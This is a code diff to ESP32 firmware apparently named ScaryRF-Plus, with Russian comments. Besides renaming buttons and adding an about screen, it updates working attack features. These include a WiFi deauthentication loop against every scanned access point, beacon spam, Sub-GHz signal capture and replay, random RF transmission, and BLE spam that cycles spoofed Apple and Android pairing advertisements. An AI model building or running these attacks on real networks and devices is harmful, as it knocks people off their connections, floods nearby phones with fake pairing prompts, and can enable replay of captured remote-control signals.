@@ -18,10 +18,10 @@ NimBLEAdvertising *pAdvertising;
 
 #define RX_PIN 4
 #define TX_PIN 2
-#define BUTTON_PIN 33      // ОК
-#define BUTTON_PIN_UP 32   // Вверх
-#define BUTTON_PIN_DOWN 26 // Вниз
-#define BUTTON_PIN_LEFT 27 // Назад
+#define BUTTON_OK 33   // ОК
+#define BUTTON_EXIT 32 // Вверх
+#define BUTTON_DOWN 26 // Вниз
+#define BUTTON_UP 27   // Назад
 #define FREQUENCY_SWITCH_PIN 13
 #define SCREEN_WIDTH 128
 #define SCREEN_HEIGHT 64
@@ -46,6 +46,9 @@ static const uint32_t subghz_frequency_list[] = {
 #define WAVEFORM_SAMPLES 128
 int waveform[WAVEFORM_SAMPLES] = {0};
 int waveformIndex = 0;
+
+// Variable to disable WiFi during BLE
+bool disableWiFiDuringBLE = true;
 
 // ---------------------МЕНЮ--------------------- //
 struct menu_entry_type {
@@ -94,7 +97,7 @@ const menu_entry_type menu_entry_list[] = {
   { u8g2_font_open_iconic_all_4x_t, 84, "SubGHz", SubGHz_menu },
   { u8g2_font_open_iconic_all_4x_t, 247, "Wifi", wifi_menu },
   { u8g2_font_open_iconic_all_4x_t, 94, "Bluetooth", bluetooth_menu },
-  { u8g2_font_open_iconic_all_4x_t, 129, "Configuration", NULL },
+  { u8g2_font_open_iconic_all_4x_t, 129, "Config", NULL },
   { NULL, 0, NULL, NULL }
 };
 
@@ -144,21 +147,17 @@ void WiFiSpam() {
   Serial.println("[WiFi] Запуск WiFi спама...");
   u8g2.clearBuffer();
   u8g2.setCursor(0, 10);
-  u8g2.print("WiFi Spam...");
+  u8g2.print(" WiFi Spam...");
   u8g2.setCursor(0, 20);
-  u8g2.print("Press * to stop");
+  u8g2.print(" Press * to stop");
   u8g2.sendBuffer();
 
-  // Инициализация WiFi
   WiFi.mode(WIFI_OFF);
   WiFi.mode(WIFI_STA);
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
-
-  // Получение случайного MAC
   esp_wifi_get_mac(WIFI_IF_STA, macAddr);
 
-  // Установка размера пакета
   packetSize = sizeof(beaconPacket);
   if (wpa2) {
     beaconPacket[34] = 0x31;
@@ -167,7 +166,7 @@ void WiFiSpam() {
     packetSize -= 26;
   }
 
-  while (digitalRead(BUTTON_PIN_UP) != LOW) {
+  while (digitalRead(BUTTON_EXIT) != LOW) {
     if (spamtype == 1) {
       beaconSpamList(funnyssids);
     } else {
@@ -176,7 +175,6 @@ void WiFiSpam() {
     delay(1);
   }
 
-  // Стоп
   esp_wifi_set_promiscuous(false);
   WiFi.mode(WIFI_OFF);
   Serial.println("[WiFi] WiFi спам остановлен");
@@ -186,22 +184,20 @@ void WiFiDeauth() {
   Serial.println("[WiFi] Запуск деаутентификации...");
   u8g2.clearBuffer();
   u8g2.setCursor(0, 10);
-  u8g2.print("WiFi Deauth...");
+  u8g2.print(" WiFi Deauth...");
   u8g2.setCursor(0, 20);
-  u8g2.print("Scanning networks...");
+  u8g2.print(" Scanning networks...");
   u8g2.sendBuffer();
 
-  // Инициализация WiFi
   WiFi.mode(WIFI_STA);
   esp_wifi_start();
 
-  // Сканирование сетей
   int16_t numNetworks = WiFi.scanNetworks();
   if (numNetworks <= 0) {
     Serial.println("[WiFi] Сети не найдены");
     u8g2.clearBuffer();
     u8g2.setCursor(0, 10);
-    u8g2.print("No networks found");
+    u8g2.print(" No networks found");
     u8g2.sendBuffer();
     delay(2000);
     return;
@@ -210,27 +206,25 @@ void WiFiDeauth() {
   Serial.printf("[WiFi] Найдено %d сетей\n", numNetworks);
   u8g2.clearBuffer();
   u8g2.setCursor(0, 10);
-  u8g2.print("Deauth attack...");
+  u8g2.print(" Deauth attack...");
   u8g2.setCursor(0, 20);
-  u8g2.print("Press * to stop");
+  u8g2.print(" Press * to stop");
   u8g2.sendBuffer();
 
-  // Подготовка deauth
   memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
 
-  while (digitalRead(BUTTON_PIN_UP) != LOW) {
+  while (digitalRead(BUTTON_EXIT) != LOW) {
     for (int i = 0; i < numNetworks; i++) {
       wifi_ap_record_t ap_record;
       memcpy(&ap_record, WiFi.getScanInfoByIndex(i), sizeof(wifi_ap_record_t));
       
       wsl_bypasser_send_deauth_frame(&ap_record, ap_record.primary);
       
-      if (digitalRead(BUTTON_PIN_UP) == LOW) break;
+      if (digitalRead(BUTTON_EXIT) == LOW) break;
       delay(100);
     }
   }
 
-  // Стоп
   WiFi.mode(WIFI_OFF);
   Serial.println("[WiFi] Деаутентификация остановлена");
 }
@@ -240,11 +234,11 @@ void setup() {
   Serial.begin(115200);
   Serial.println("[SYSTEM] Инициализация ScaryRF...");
 
-  pinMode(BUTTON_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_OK, INPUT_PULLUP);
   pinMode(FREQUENCY_SWITCH_PIN, INPUT_PULLUP);
-  pinMode(BUTTON_PIN_UP, INPUT_PULLUP);
-  pinMode(BUTTON_PIN_DOWN, INPUT_PULLUP);
-  pinMode(BUTTON_PIN_LEFT, INPUT_PULLUP);
+  pinMode(BUTTON_EXIT, INPUT_PULLUP);
+  pinMode(BUTTON_DOWN, INPUT_PULLUP);
+  pinMode(BUTTON_UP, INPUT_PULLUP);
 
   u8g2.begin();
   u8g2.enableUTF8Print();
@@ -261,7 +255,7 @@ void setup() {
     u8g2.drawXBMP(0, 0, scary_width, scary_height, scary_bits);
   } while (u8g2.nextPage());
   
-  while (digitalRead(BUTTON_PIN_DOWN) != LOW && digitalRead(BUTTON_PIN) != LOW && digitalRead(BUTTON_PIN_LEFT) != LOW && digitalRead(BUTTON_PIN_UP) != LOW) {
+  while (digitalRead(BUTTON_DOWN) != LOW && digitalRead(BUTTON_OK) != LOW && digitalRead(BUTTON_UP) != LOW && digitalRead(BUTTON_EXIT) != LOW) {
     // Нажатие для выхода из заставки
   }
 
@@ -290,13 +284,13 @@ void setup() {
 void loop() {
   int8_t event = 0;
 
-  if (digitalRead(BUTTON_PIN_DOWN) == LOW) {
+  if (digitalRead(BUTTON_DOWN) == LOW) {
     event = 1; // U8X8_MSG_GPIO_MENU_NEXT
-  } else if (digitalRead(BUTTON_PIN_LEFT) == LOW) {
+  } else if (digitalRead(BUTTON_UP) == LOW) {
     event = 2; // U8X8_MSG_GPIO_MENU_PREV
-  } else if (digitalRead(BUTTON_PIN) == LOW) {
+  } else if (digitalRead(BUTTON_OK) == LOW) {
     event = 3; // U8X8_MSG_GPIO_MENU_SELECT
-  } else if (digitalRead(BUTTON_PIN_UP) == LOW) {
+  } else if (digitalRead(BUTTON_EXIT) == LOW) {
     event = 4; // Возврат в главное меню
   }
 
@@ -318,20 +312,20 @@ void loop() {
         }
         if (strcmp(current_state.menu[current_state.position].name, "Spectrum") == 0) {
           Serial.println("[SubGHz] Запуск режима Spectrum");
-          while (digitalRead(BUTTON_PIN_UP) != LOW) {
+          while (digitalRead(BUTTON_EXIT) != LOW) {
             Spectrum();
           }
         }
         if (strcmp(current_state.menu[current_state.position].name, "Analyser") == 0) {
           Serial.println("[SubGHz] Запуск анализатора");
-          while (digitalRead(BUTTON_PIN_UP) != LOW) {
+          while (digitalRead(BUTTON_EXIT) != LOW) {
             Analyser();     
           }
         }
         if (strcmp(current_state.menu[current_state.position].name, "Random") == 0) {
           Serial.println("[SubGHz] Запуск случайных сигналов");
-          while (digitalRead(BUTTON_PIN_UP) != LOW) {
-            if (digitalRead(BUTTON_PIN) == LOW) {
+          while (digitalRead(BUTTON_EXIT) != LOW) {
+            if (digitalRead(BUTTON_OK) == LOW) {
               SendRandom();
             }
           }
@@ -340,7 +334,7 @@ void loop() {
           Serial.println("[WiFi] Evil portal (в разработке)");
           u8g2.clearBuffer();
           u8g2.setCursor(0, 10);
-          u8g2.print("In progress...");
+          u8g2.print(" In progress...");
           u8g2.sendBuffer();
         }
         if (strcmp(current_state.menu[current_state.position].name, "Deauther") == 0) {
@@ -351,10 +345,30 @@ void loop() {
         }
         if (strcmp(current_state.menu[current_state.position].name, "BLE Spam") == 0) {
           Serial.println("[BLE] Запуск BLE спама");
-          while (digitalRead(BUTTON_PIN_UP) != LOW) {                      
+          while (digitalRead(BUTTON_EXIT) != LOW) {                      
             Bleloop();
           }
+          // Restore WiFi state after BLE spam
+          if (disableWiFiDuringBLE) {
+            Serial.println("[WiFi] Восстановление WiFi после BLE");
+            WiFi.mode(WIFI_OFF); // Ensure WiFi remains off unless needed
+          }
           Serial.println("[BLE] BLE спам остановлен");
+        }
+        if (strcmp(current_state.menu[current_state.position].name, "Config") == 0) {
+          Serial.println("[SYSTEM] Config selected");
+          u8g2.clearBuffer();
+          u8g2.setCursor(0, 20);
+          u8g2.print(" ScaryRF-Plus v1.1");
+          u8g2.setCursor(0, 40);
+          u8g2.print(" by Teapot174");
+          u8g2.sendBuffer();
+          
+          // Ждем нажатия * для выхода
+          while (digitalRead(BUTTON_EXIT) != LOW) {
+            delay(10);
+          }
+          return;
         }
       }
     }
@@ -378,11 +392,11 @@ void loop() {
 // ---------------------SubGHz ФУНКЦИИ--------------------- //
 void Detect() {
   Serial.println("[SubGHz] Ожидание сигнала...");
-  while (digitalRead(BUTTON_PIN_UP) != LOW) {
+  while (digitalRead(BUTTON_EXIT) != LOW) {
     if (receivedBitLength == 0 ) {
       u8g2.clearBuffer();
       u8g2.setCursor(0, 10);
-      u8g2.print("Waiting Signal...");
+      u8g2.print(" Waiting Signal...");
       u8g2.sendBuffer();
     }
     if (mySwitch.available()) {
@@ -395,18 +409,18 @@ void Detect() {
         Serial.printf("[SubGHz] Получен сигнал: %lu, бит: %d, протокол: %d\n", receivedValue, receivedBitLength, receivedProtocol);
         u8g2.clearBuffer();
         u8g2.setCursor(0, 10);
-        u8g2.print("Received Signal:");
+        u8g2.print(" Received Signal:");
         u8g2.setCursor(0, 20);
         u8g2.print(receivedValue);
         u8g2.setCursor(0, 30);
-        u8g2.printf("Bit:%d  Ptc:%d", receivedBitLength, receivedProtocol);
+        u8g2.printf(" Bit:%d  Ptc:%d", receivedBitLength, receivedProtocol);
         u8g2.sendBuffer();
 
         mySwitch.resetAvailable();
       }
     }
 
-    if (digitalRead(BUTTON_PIN) == LOW && receivedValue != 0) {
+    if (digitalRead(BUTTON_OK) == LOW && receivedValue != 0) {
       Serial.println("[SubGHz] Повтор сигнала...");
       mySwitch.disableReceive();
       delay(100);
@@ -415,11 +429,11 @@ void Detect() {
 
       u8g2.clearBuffer();
       u8g2.setCursor(0, 10);
-      u8g2.print("Received Signal:");
+      u8g2.print(" Received Signal:");
       u8g2.setCursor(0, 20);
       u8g2.print(receivedValue);
       u8g2.setCursor(0, 30);
-      u8g2.print("Sending...");
+      u8g2.print(" Sending...");
       u8g2.sendBuffer();
 
       mySwitch.setProtocol(receivedProtocol);
@@ -429,11 +443,11 @@ void Detect() {
 
       u8g2.clearBuffer();
       u8g2.setCursor(0, 10);
-      u8g2.print("Received Signal:");
+      u8g2.print(" Received Signal:");
       u8g2.setCursor(0, 20);
       u8g2.print(receivedValue);
       u8g2.setCursor(0, 30);
-      u8g2.print("OK");
+      u8g2.print(" OK");
       u8g2.sendBuffer();
 
       ELECHOUSE_cc1101.SetRx();
@@ -453,7 +467,7 @@ void Detect() {
 }
 
 void Spectrum() {
-  if (digitalRead(BUTTON_PIN) == LOW) {
+  if (digitalRead(BUTTON_OK) == LOW) {
     Serial.println("[SubGHz] Запуск Spectrum");
     u8g2.clearBuffer();
     float mhz = 0;
@@ -491,7 +505,7 @@ void Spectrum() {
         i = 1;
       }
 
-      if (digitalRead(BUTTON_PIN) != LOW) {
+      if (digitalRead(BUTTON_OK) != LOW) {
         break;
       }
     }
@@ -505,10 +519,10 @@ void Analyser() {
   Serial.println("[SubGHz] Запуск анализатора частот");
   u8g2.clearBuffer();
   u8g2.setCursor(0, 20);
-  u8g2.printf("Analyzing...");
+  u8g2.printf(" Analyzing...");
   u8g2.sendBuffer();
 
-  while (digitalRead(BUTTON_PIN_UP) != LOW) {
+  while (digitalRead(BUTTON_EXIT) != LOW) {
     int rssi;
     uint32_t detectedFrequency = 0;
     int detectedRssi = -100;
@@ -516,7 +530,7 @@ void Analyser() {
     for (size_t i = 0; i < sizeof(subghz_frequency_list) / sizeof(subghz_frequency_list[0]); i++) {
       uint32_t frequency = subghz_frequency_list[i];
       
-      if (digitalRead(BUTTON_PIN_UP) == LOW){
+      if (digitalRead(BUTTON_EXIT) == LOW) {
         break;
       }
 
@@ -535,11 +549,11 @@ void Analyser() {
       Serial.printf("[SubGHz] Обнаружен сигнал: %.2fMHz, RSSI: %ddBm\n", (float)detectedFrequency / 1000000.0, detectedRssi);
       u8g2.clearBuffer();
       u8g2.setCursor(0, 10);
-      u8g2.printf("Signal detected:");
+      u8g2.printf(" Signal detected:");
       u8g2.setCursor(0, 20);
-      u8g2.printf("Frequency:%.2fMHz", (float)detectedFrequency / 1000000.0);
+      u8g2.printf(" Frequency:%.2fMHz", (float)detectedFrequency / 1000000.0);
       u8g2.setCursor(0, 30);
-      u8g2.printf("RSSI:%ddBm", detectedRssi);
+      u8g2.printf(" RSSI:%ddBm", detectedRssi);
       u8g2.sendBuffer();
       detectedFrequency = 0;
     }
@@ -563,7 +577,7 @@ void SendRandom() {
 
   u8g2.clearBuffer();
   u8g2.setCursor(0, 10);
-  u8g2.print("Sending Random:");
+  u8g2.print(" Sending Random:");
   u8g2.sendBuffer();
   delay(100);
 
@@ -583,11 +597,11 @@ void SendRandom() {
 
   u8g2.clearBuffer();
   u8g2.setCursor(0, 10);
-  u8g2.print("Sending Random:");
+  u8g2.print(" Sending Random:");
   u8g2.setCursor(0, 20);
   u8g2.print(randomValue);
   u8g2.setCursor(0, 30);
-  u8g2.print("Sending...");
+  u8g2.print(" Sending...");
   u8g2.sendBuffer();
 
   mySwitch.setProtocol(randomProtocol);
@@ -597,11 +611,11 @@ void SendRandom() {
 
   u8g2.clearBuffer();
   u8g2.setCursor(0, 10);
-  u8g2.print("Sending Random:");
+  u8g2.print(" Sending Random:");
   u8g2.setCursor(0, 20);
   u8g2.print(randomValue);
   u8g2.setCursor(0, 30);
-  u8g2.print("OK");
+  u8g2.print(" OK");
   u8g2.sendBuffer();
 
   ELECHOUSE_cc1101.SetRx();
@@ -612,56 +626,61 @@ void SendRandom() {
 }
 
 // ---------------------BLE ФУНКЦИИ--------------------- //
+#include "blespam.h"
+
 int i = 1;
-void Blesetup(){
-  Serial.println("[BLE] Инициализация BLE...");
+
+void Blesetup() {
+  if (disableWiFiDuringBLE) {
+    Serial.println("[WiFi] Отключение WiFi для BLE");
+    WiFi.mode(WIFI_OFF);
+  }
   NimBLEDevice::init("");
-
-  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
-  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
-  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN ,ESP_PWR_LVL_P9);
-
-  NimBLEServer *pServer = NimBLEDevice::createServer();
+  // ... настройка мощности
+  NimBLEServer* pServer = NimBLEDevice::createServer();
   pAdvertising = pServer->getAdvertising();
 }
 
-BLEAdvertisementData getOAdvertisementData() {
-  NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
-  uint8_t packet[17];
-  uint8_t i = 0;
-
-  packet[i++] = 16;    // Длина пакета
-  packet[i++] = 0xFF;  // Тип пакета
-  packet[i++] = 0x4C;  // Company ID (Apple, Inc.)
-  packet[i++] = 0x00;
-  packet[i++] = 0x0F;  // Тип
-  packet[i++] = 0x05;  // Длина
-  packet[i++] = 0xC1;  // Action Flags
-  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
-  packet[i++] = types[rand() % sizeof(types)];  // Случайный тип
-  esp_fill_random(&packet[i], 3); // Случайный тег аутентификации
-  i += 3;   
-  packet[i++] = 0x00;
-  packet[i++] = 0x00;
-  packet[i++] = 0x10;
-  esp_fill_random(&packet[i], 3);
-
-  randomAdvertisementData.addData(std::string((char *)packet, 17));
-  return randomAdvertisementData;
+BLEAdvertisementData getAppleAdvertisement() {
+  uint8_t* devices[] = {Airpods, AirpodsPro, AirpodsMax, AirpodsGen2, AirpodsGen3, AirpodsProGen2, PowerBeats, PowerBeatsPro, BeatsSoloPro, BeatsStudioBuds, BeatsFlex, BeatsX, BeatsSolo3, BeatsStudio3, BeatsStudioPro, BeatsFitPro, BeatsStudioBudsPlus, AppleTVSetup, AppleTVPair, AppleTVNewUser, AppleTVAppleIDSetup, AppleTVWirelessAudioSync, AppleTVHomekitSetup, AppleTVKeyboard, AppleTVConnectingToNetwork, HomepodSetup, SetupNewPhone, TransferNumber, TVColorBalance, AppleVisionPro};
+  uint8_t* data = devices[rand() % (sizeof(devices)/sizeof(devices[0]))];
+  BLEAdvertisementData adv;
+  // Use setManufacturerData for Apple advertisement packets
+  adv.setManufacturerData(std::string((char*)data, data[0] + 1));
+  return adv;
 }
 
-void Bleloop(){ 
-  delay(40); 
+BLEAdvertisementData getAndroidAdvertisement() {
+  DeviceType model = android_models[rand() % android_models_count];
+  uint8_t packet[7] = {
+    0x06, 0xFF, 0xE0, 0x00, // Заголовок (Google)
+    (uint8_t)(model.value >> 16), (uint8_t)(model.value >> 8), (uint8_t)model.value
+  };
+  BLEAdvertisementData adv;
+  // Use setManufacturerData instead of addData for Android advertisement packets
+  adv.setManufacturerData(std::string((char*)packet, sizeof(packet)));
+  return adv;
+}
+
+void Bleloop() {
+  if (disableWiFiDuringBLE) {
+    WiFi.mode(WIFI_OFF); // Ensure WiFi is off during BLE loop
+  }
+  delay(200);
+  
+  // Рандомный выбор платформы
+  bool isApple = rand() % 2;
+  BLEAdvertisementData advData = isApple ? getAppleAdvertisement() : getAndroidAdvertisement();
+  pAdvertising->setAdvertisementData(advData);
+
+  // Обновление дисплея
   u8g2.clearBuffer();
   u8g2.setCursor(0, 10);
-  u8g2.print("IOS-Spam...");
-  u8g2.setCursor(0, 20);    
-  u8g2.print(i);
-  i++;
+  u8g2.print(isApple ? " iOS" : " Android");
+  u8g2.print("-Spam #"); 
+  u8g2.print(i++);
   u8g2.sendBuffer();
-  
-  NimBLEAdvertisementData advertisementData = getOAdvertisementData();
-  pAdvertising->setAdvertisementData(advertisementData);
+
   pAdvertising->start();
   delay(20);
   pAdvertising->stop();
